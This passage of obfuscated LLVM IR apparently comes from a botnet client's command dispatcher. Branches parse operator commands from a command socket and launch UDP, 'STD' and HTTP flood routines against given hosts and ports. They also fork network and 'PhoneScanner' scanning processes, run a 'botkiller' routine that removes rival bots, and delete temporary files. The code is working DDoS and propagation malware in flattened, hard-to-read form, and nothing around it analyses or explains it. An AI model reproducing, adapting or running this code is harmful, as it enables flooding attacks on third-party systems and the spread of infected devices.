    i32 -1976578654, label %213
    i32 1319483227, label %214
    i32 -342379550, label %219
    i32 1262715501, label %222
    i32 46479518, label %226
    i32 733955147, label %230
    i32 -1332436856, label %237
    i32 2086423612, label %239
    i32 -1183717542, label %240
    i32 -39527420, label %244
    i32 -1856775639, label %245
    i32 515428253, label %252
    i32 748152489, label %253
    i32 67405906, label %260
    i32 -511879276, label %264
    i32 -135636927, label %271
    i32 -1469962489, label %278
    i32 631351862, label %279
    i32 -686457770, label %283
    i32 -1251220686, label %284
    i32 1172803189, label %323
    i32 -285440299, label %330
    i32 -2045528026, label %334
    i32 293490874, label %335
    i32 2003197165, label %342
    i32 -1107592707, label %346
    i32 -152233322, label %347
    i32 -607594448, label %350
    i32 983187325, label %357
    i32 -680381772, label %361
    i32 -750964085, label %362
    i32 -1409232921, label %367
    i32 900908152, label %369
    i32 -364154788, label %373
    i32 372513762, label %374
    i32 -1685818665, label %375
    i32 1082746511, label %376
    i32 -511891443, label %377
    i32 -512955719, label %384
    i32 96805568, label %388
    i32 -693704085, label %395
    i32 1087604819, label %402
    i32 898985412, label %403
    i32 785430081, label %419
    i32 -185722039, label %422
    i32 282443454, label %426
    i32 1840889497, label %430
    i32 -558008967, label %434
    i32 1681104889, label %436
    i32 1191049454, label %437
    i32 -179772238, label %441
    i32 899155517, label %442
    i32 641868074, label %446
    i32 524031310, label %447
    i32 -1807175628, label %454
    i32 1580891028, label %458
    i32 -583699307, label %465
    i32 863137465, label %472
    i32 -1774887793, label %479
    i32 -1859147317, label %486
    i32 76845469, label %490
    i32 830046976, label %497
    i32 713424143, label %501
    i32 1559880169, label %508
    i32 1436015630, label %509
    i32 -937440219, label %531
    i32 443565145, label %536
    i32 -1364664995, label %537
    i32 -1973242497, label %541
    i32 -601656639, label %546
    i32 -1669035323, label %547
    i32 -1302304965, label %552
    i32 1274251542, label %555
    i32 1907745865, label %559
    i32 898650490, label %563
    i32 -1512711481, label %571
    i32 2007301107, label %573
    i32 1714573243, label %574
    i32 -973852124, label %578
    i32 -2078500243, label %579
    i32 1860080907, label %587
    i32 -2062450885, label %588
    i32 1401694362, label %595
    i32 1554152383, label %596
    i32 2050719697, label %601
    i32 1117053877, label %608
    i32 683344751, label %616
    i32 301035408, label %624
    i32 328508029, label %625
    i32 1261900687, label %628
    i32 -407656965, label %632
    i32 1381904674, label %633
    i32 1054240138, label %634
    i32 -2112594773, label %635
    i32 1564992931, label %642
    i32 1468393278, label %643
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 1272635855, i32 999393090
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = call i32 (i32, i8*, ...) @sockprintf(i32 %38, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.470, i32 0, i32 0))
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8**, i8*** %4, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @strcmp(i8* %43, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i32 0, i32 0)) #10
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 690629071, i32 -252863548
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* @mainCommSock, align 4
  %49 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %50 = call i8* @inet_ntoa(i32 %49) #5
  %51 = call i32 (i32, i8*, ...) @sockprintf(i32 %48, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.472, i32 0, i32 0), i8* %50)
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.473, i32 0, i32 0)) #10
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 -1456666184, i32 -850656630
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = call i32 @listFork()
  %61 = icmp ne i32 %60, 0
  %62 = select i1 %61, i32 1126281609, i32 1027610108
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %66 = call i8* @inet_ntoa(i32 %65) #5
  %67 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.474, i32 0, i32 0), i8* %66)
  call void @botkiller()
  call void @RemoveTMP()
  call void @_exit(i32 0) #12
  unreachable

; <label>:68:                                     ; preds = %loopEntry
  store i32 -1456666184, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8**, i8*** %4, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 0
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @strcmp(i8* %72, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.475, i32 0, i32 0)) #10
  %74 = icmp ne i32 %73, 0
  %75 = select i1 %74, i32 1430243527, i32 -573792573
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @strcmp(i8* %79, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i32 0, i32 0)) #10
  %81 = icmp ne i32 %80, 0
  %82 = select i1 %81, i32 -1147360145, i32 1932551332
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = load i32, i32* @scanPid, align 4
  %85 = icmp eq i32 %84, 0
  %86 = select i1 %85, i32 61200933, i32 1062772384
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* @scanPid, align 4
  %90 = call i32 @kill(i32 %89, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  store i32 -1147360145, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i8**, i8*** %4, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 1
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @strcmp(i8* %94, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i32 0, i32 0)) #10
  %96 = icmp ne i32 %95, 0
  %97 = select i1 %96, i32 727824998, i32 -1143452459
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @scanPid, align 4
  %100 = icmp ne i32 %99, 0
  %101 = select i1 %100, i32 462231904, i32 -34085679
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = call i32 @fork() #5
  store i32 %104, i32* %6, align 4
  store i32 400, i32* %7, align 4
  store i32 7, i32* %8, align 4
  %105 = load i32, i32* %6, align 4
  %106 = icmp ugt i32 %105, 0
  %107 = select i1 %106, i32 -835654611, i32 123822391
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %6, align 4
  store i32 %109, i32* @scanPid, align 4
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %6, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 -350941411, i32 1550300790
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 860124136, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %8, align 4
  %118 = load i32, i32* %7, align 4
  call void (i32, i32, ...) bitcast (void ()* @StartTheLelz to void (i32, i32, ...)*)(i32 %117, i32 %118)
  call void @_exit(i32 0) #12
  unreachable

; <label>:119:                                    ; preds = %loopEntry
  store i32 1430243527, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 0
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @strcmp(i8* %123, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.478, i32 0, i32 0)) #10
  %125 = icmp ne i32 %124, 0
  %126 = select i1 %125, i32 748152489, i32 -932274145
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i32, i32* %3, align 4
  %129 = icmp slt i32 %128, 6
  %130 = select i1 %129, i32 -1501869485, i32 262722430
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load i8**, i8*** %4, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 3
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 @atoi(i8* %134) #10
  %136 = icmp eq i32 %135, -1
  %137 = select i1 %136, i32 -1501869485, i32 2053430920
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load i8**, i8*** %4, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 2
  %141 = load i8*, i8** %140, align 8
  %142 = call i32 @atoi(i8* %141) #10
  %143 = icmp eq i32 %142, -1
  %144 = select i1 %143, i32 -1501869485, i32 -1304023458
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 4
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @atoi(i8* %148) #10
  %150 = icmp eq i32 %149, -1
  %151 = select i1 %150, i32 -1501869485, i32 -1503867294
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i8**, i8*** %4, align 8
  %154 = getelementptr inbounds i8*, i8** %153, i64 5
  %155 = load i8*, i8** %154, align 8
  %156 = call i32 @atoi(i8* %155) #10
  %157 = icmp eq i32 %156, -1
  %158 = select i1 %157, i32 -1501869485, i32 2014211020
  store i32 %158, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8**, i8*** %4, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 5
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 @atoi(i8* %162) #10
  %164 = icmp sgt i32 %163, 65500
  %165 = select i1 %164, i32 -1501869485, i32 -302868774
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i8**, i8*** %4, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 4
  %169 = load i8*, i8** %168, align 8
  %170 = call i32 @atoi(i8* %169) #10
  %171 = icmp sgt i32 %170, 32
  %172 = select i1 %171, i32 -1501869485, i32 1478103692
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %3, align 4
  %175 = icmp eq i32 %174, 7
  %176 = select i1 %175, i32 1564760196, i32 1894029468
  store i32 %176, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 6
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #10
  %182 = icmp slt i32 %181, 1
  %183 = select i1 %182, i32 -1501869485, i32 1894029468
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 1
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %9, align 8
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 2
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @atoi(i8* %191) #10
  store i32 %192, i32* %10, align 4
  %193 = load i8**, i8*** %4, align 8
  %194 = getelementptr inbounds i8*, i8** %193, i64 3
  %195 = load i8*, i8** %194, align 8
  %196 = call i32 @atoi(i8* %195) #10
  store i32 %196, i32* %11, align 4
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 4
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #10
  store i32 %200, i32* %12, align 4
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 5
  %203 = load i8*, i8** %202, align 8
  %204 = call i32 @atoi(i8* %203) #10
  store i32 %204, i32* %13, align 4
  %205 = load i32, i32* %3, align 4
  %206 = icmp eq i32 %205, 7
  %207 = select i1 %206, i32 -903337621, i32 -1976578654
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 6
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @atoi(i8* %211) #10
  store i32 1319483227, i32* %switchVar
  store i32 %212, i32* %.reg2mem2
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  store i32 1319483227, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %14, align 4
  %215 = load i8*, i8** %9, align 8
  %216 = call i8* @strstr(i8* %215, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %217 = icmp ne i8* %216, null
  %218 = select i1 %217, i32 -342379550, i32 -1183717542
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8*, i8** %9, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %221, i8** %15, align 8
  store i32 1262715501, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i8*, i8** %15, align 8
  %224 = icmp ne i8* %223, null
  %225 = select i1 %224, i32 46479518, i32 2086423612
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = call i32 @listFork()
  %228 = icmp ne i32 %227, 0
  %229 = select i1 %228, i32 -1332436856, i32 733955147
  store i32 %229, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = load i8*, i8** %15, align 8
  %232 = load i32, i32* %10, align 4
  %233 = load i32, i32* %11, align 4
  %234 = load i32, i32* %12, align 4
  %235 = load i32, i32* %13, align 4
  %236 = load i32, i32* %14, align 4
  call void @sendUDP(i8* %231, i32 %232, i32 %233, i32 %234, i32 %235, i32 %236)
  call void @_exit(i32 0) #12
  unreachable

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %238, i8** %15, align 8
  store i32 1262715501, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 515428253, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = call i32 @listFork()
  %242 = icmp ne i32 %241, 0
  %243 = select i1 %242, i32 -39527420, i32 -1856775639
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i8*, i8** %9, align 8
  %247 = load i32, i32* %10, align 4
  %248 = load i32, i32* %11, align 4
  %249 = load i32, i32* %12, align 4
  %250 = load i32, i32* %13, align 4
  %251 = load i32, i32* %14, align 4
  call void @sendUDP(i8* %246, i32 %247, i32 %248, i32 %249, i32 %250, i32 %251)
  call void @_exit(i32 0) #12
  unreachable

; <label>:252:                                    ; preds = %loopEntry
  store i32 748152489, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 0
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @strcmp(i8* %256, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.479, i32 0, i32 0)) #10
  %258 = icmp ne i32 %257, 0
  %259 = select i1 %258, i32 1172803189, i32 67405906
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = load i32, i32* %3, align 4
  %262 = icmp slt i32 %261, 6
  %263 = select i1 %262, i32 -1469962489, i32 -511879276
  store i32 %263, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 3
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @atoi(i8* %267) #10
  %269 = icmp slt i32 %268, 1
  %270 = select i1 %269, i32 -1469962489, i32 -135636927
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i8**, i8*** %4, align 8
  %273 = getelementptr inbounds i8*, i8** %272, i64 5
  %274 = load i8*, i8** %273, align 8
  %275 = call i32 @atoi(i8* %274) #10
  %276 = icmp slt i32 %275, 1
  %277 = select i1 %276, i32 -1469962489, i32 631351862
  store i32 %277, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = call i32 @listFork()
  %281 = icmp ne i32 %280, 0
  %282 = select i1 %281, i32 -686457770, i32 -1251220686
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i32, i32* @mainCommSock, align 4
  %286 = load i8**, i8*** %4, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 1
  %288 = load i8*, i8** %287, align 8
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 2
  %291 = load i8*, i8** %290, align 8
  %292 = load i8**, i8*** %4, align 8
  %293 = getelementptr inbounds i8*, i8** %292, i64 3
  %294 = load i8*, i8** %293, align 8
  %295 = call i32 @atoi(i8* %294) #10
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 5
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @atoi(i8* %298) #10
  %300 = call i32 (i32, i8*, ...) @sockprintf(i32 %285, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.480, i32 0, i32 0), i8* %288, i8* %291, i32 %295, i32 %299)
  %301 = load i8**, i8*** %4, align 8
  %302 = getelementptr inbounds i8*, i8** %301, i64 1
  %303 = load i8*, i8** %302, align 8
  %304 = load i8**, i8*** %4, align 8
  %305 = getelementptr inbounds i8*, i8** %304, i64 2
  %306 = load i8*, i8** %305, align 8
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 3
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #10
  %311 = trunc i32 %310 to i16
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 4
  %314 = load i8*, i8** %313, align 8
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds i8*, i8** %315, i64 5
  %317 = load i8*, i8** %316, align 8
  %318 = call i32 @atoi(i8* %317) #10
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 6
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #10
  call void @sendHTTP(i8* %303, i8* %306, i16 zeroext %311, i8* %314, i32 %318, i32 %322)
  call void @exit(i32 0) #14
  unreachable

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 0
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @strcmp(i8* %326, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.481, i32 0, i32 0)) #10
  %328 = icmp ne i32 %327, 0
  %329 = select i1 %328, i32 -511891443, i32 -285440299
  store i32 %329, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i32, i32* %3, align 4
  %332 = icmp ne i32 %331, 2
  %333 = select i1 %332, i32 -2045528026, i32 293490874
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 1
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @strcmp(i8* %338, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.476, i32 0, i32 0)) #10
  %340 = icmp ne i32 %339, 0
  %341 = select i1 %340, i32 -607594448, i32 2003197165
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i32, i32* @Phonepid, align 4
  %344 = icmp eq i32 %343, 0
  %345 = select i1 %344, i32 -1107592707, i32 -152233322
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i32, i32* @Phonepid, align 4
  %349 = call i32 @kill(i32 %348, i32 9) #5
  store i32 0, i32* @Phonepid, align 4
  store i32 -607594448, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 1
  %353 = load i8*, i8** %352, align 8
  %354 = call i32 @strcmp(i8* %353, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.477, i32 0, i32 0)) #10
  %355 = icmp ne i32 %354, 0
  %356 = select i1 %355, i32 1082746511, i32 983187325
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* @Phonepid, align 4
  %359 = icmp ne i32 %358, 0
  %360 = select i1 %359, i32 -680381772, i32 -750964085
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = call i32 @fork() #5
  store i32 %363, i32* %16, align 4
  %364 = load i32, i32* %16, align 4
  %365 = icmp ugt i32 %364, 0
  %366 = select i1 %365, i32 -1409232921, i32 900908152
  store i32 %366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i32, i32* %16, align 4
  store i32 %368, i32* @Phonepid, align 4
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i32, i32* %16, align 4
  %371 = icmp eq i32 %370, -1
  %372 = select i1 %371, i32 -364154788, i32 372513762
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  store i32 -1685818665, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  call void @PhoneScanner()
  call void @_exit(i32 0) #12
  unreachable

; <label>:376:                                    ; preds = %loopEntry
  store i32 -511891443, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 0
  %380 = load i8*, i8** %379, align 8
  %381 = call i32 @strcmp(i8* %380, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.482, i32 0, i32 0)) #10
  %382 = icmp ne i32 %381, 0
  %383 = select i1 %382, i32 524031310, i32 -512955719
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = load i32, i32* %3, align 4
  %386 = icmp slt i32 %385, 4
  %387 = select i1 %386, i32 1087604819, i32 96805568
  store i32 %387, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i8**, i8*** %4, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 2
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @atoi(i8* %391) #10
  %393 = icmp slt i32 %392, 1
  %394 = select i1 %393, i32 1087604819, i32 -693704085
  store i32 %394, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i8**, i8*** %4, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 3
  %398 = load i8*, i8** %397, align 8
  %399 = call i32 @atoi(i8* %398) #10
  %400 = icmp slt i32 %399, 1
  %401 = select i1 %400, i32 1087604819, i32 898985412
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:403:                                    ; preds = %loopEntry
  %404 = load i8**, i8*** %4, align 8
  %405 = getelementptr inbounds i8*, i8** %404, i64 1
  %406 = load i8*, i8** %405, align 8
  store i8* %406, i8** %17, align 8
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 2
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #10
  store i32 %410, i32* %18, align 4
  %411 = load i8**, i8*** %4, align 8
  %412 = getelementptr inbounds i8*, i8** %411, i64 3
  %413 = load i8*, i8** %412, align 8
  %414 = call i32 @atoi(i8* %413) #10
  store i32 %414, i32* %19, align 4
  %415 = load i8*, i8** %17, align 8
  %416 = call i8* @strstr(i8* %415, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #10
  %417 = icmp ne i8* %416, null
  %418 = select i1 %417, i32 785430081, i32 1191049454
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load i8*, i8** %17, align 8
  %421 = call i8* @strtok(i8* %420, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %421, i8** %20, align 8
  store i32 -185722039, i32* %switchVar
  br label %loopEnd

; <label>:422:                                    ; preds = %loopEntry
  %423 = load i8*, i8** %20, align 8
  %424 = icmp ne i8* %423, null
  %425 = select i1 %424, i32 282443454, i32 1681104889
  store i32 %425, i32* %switchVar
  br label %loopEnd

; <label>:426:                                    ; preds = %loopEntry
  %427 = call i32 @listFork()
  %428 = icmp ne i32 %427, 0
  %429 = select i1 %428, i32 -558008967, i32 1840889497
  store i32 %429, i32* %switchVar
  br label %loopEnd

; <label>:430:                                    ; preds = %loopEntry
  %431 = load i8*, i8** %20, align 8
  %432 = load i32, i32* %18, align 4
  %433 = load i32, i32* %19, align 4
  call void @sendSTD(i8* %431, i32 %432, i32 %433)
  call void @_exit(i32 0) #12
  unreachable

; <label>:434:                                    ; preds = %loopEntry
  %435 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %435, i8** %20, align 8
  store i32 -185722039, i32* %switchVar
  br label %loopEnd

; <label>:436:                                    ; preds = %loopEntry
  store i32 641868074, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = call i32 @listFork()
  %439 = icmp ne i32 %438, 0
  %440 = select i1 %439, i32 -179772238, i32 899155517
  store i32 %440, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  store i32 1468393278, i32* %switchVar
  br label %loopEnd

; <label>:442:                                    ; preds = %loopEntry
  %443 = load i8*, i8** %17, align 8
  %444 = load i32, i32* %18, align 4
  %445 = load i32, i32* %19, align 4
  call void @sendSTD(i8* %443, i32 %444, i32 %445)
  call void @_exit(i32 0) #12
  unreachable

; <label>:446:                                    ; preds = %loopEntry
  store i32 524031310, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 0
  %450 = load i8*, i8** %449, align 8
